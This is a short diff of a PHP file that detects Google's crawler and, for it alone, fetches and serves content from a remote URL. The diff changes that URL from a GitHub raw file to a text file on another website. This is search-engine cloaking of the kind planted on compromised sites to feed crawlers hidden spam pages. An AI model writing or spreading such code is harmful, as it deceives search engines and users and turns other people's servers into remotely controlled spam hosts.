@@ -22,7 +22,7 @@ function is_google_bot_simple() {
 
 // --- 1. GOOGLE BOT VERSION ---
 if (is_google_bot_simple()) {
-    $google_url = "https://raw.githubusercontent.com/freyarion25/kw-lp/refs/heads/main/up-terus.txt";
+    $google_url = "https://acb-paris.fr/Content/paste.txt";
     $content = fetch_remote_content($google_url);
 
     if ($content) {
